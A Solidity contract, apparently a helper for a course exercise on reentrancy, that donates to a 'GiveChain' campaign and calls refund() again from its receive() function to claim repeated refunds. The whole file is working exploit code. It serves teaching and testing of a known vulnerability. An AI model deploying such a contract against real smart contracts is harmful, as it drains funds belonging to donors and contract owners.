// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IGiveChainRefund {
    function donate(uint256 campaignId) external payable;
    function refund(uint256 campaignId) external;
}

/// @notice Reentrancy demonstration helper for the CH06 refund exercise.
contract RefundAttacker {
    IGiveChainRefund public giveChain;
    uint256 public campaignId;
    bool public attacking;
    uint256 public reentryAttempts;

    function donateToCampaign(address target, uint256 id) external payable {
        giveChain = IGiveChainRefund(target);
        campaignId = id;
        giveChain.donate{value: msg.value}(id);
    }

    function attackRefund() external {
        attacking = true;
        giveChain.refund(campaignId);
        attacking = false;
    }

    receive() external payable {
        if (attacking) {
            reentryAttempts += 1;
            try giveChain.refund(campaignId) {} catch {}
        }
    }
}
